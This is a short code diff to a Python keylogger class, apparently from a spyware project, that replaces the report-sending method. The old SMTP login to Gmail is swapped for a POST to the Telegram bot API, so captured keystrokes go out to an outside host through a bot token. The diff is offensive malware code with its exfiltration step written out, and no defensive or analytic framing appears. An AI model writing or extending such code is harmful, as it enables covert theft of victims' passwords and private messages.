@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import smtplib
+import requests
 
 import threading
 
@@ -50,11 +50,14 @@ class KeyLogger:
     # Create underlying back structure which will publish emails
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
+        telegeram_response = requests.post(
+            f"https://api.telegram.org/bot{password}/sendMessage",
+            data={
+                "chat_id": "email",
+                "text": message
+            },timeout=5
+        )
+        return telegeram_response
 
     # Create Report & Send Email
 
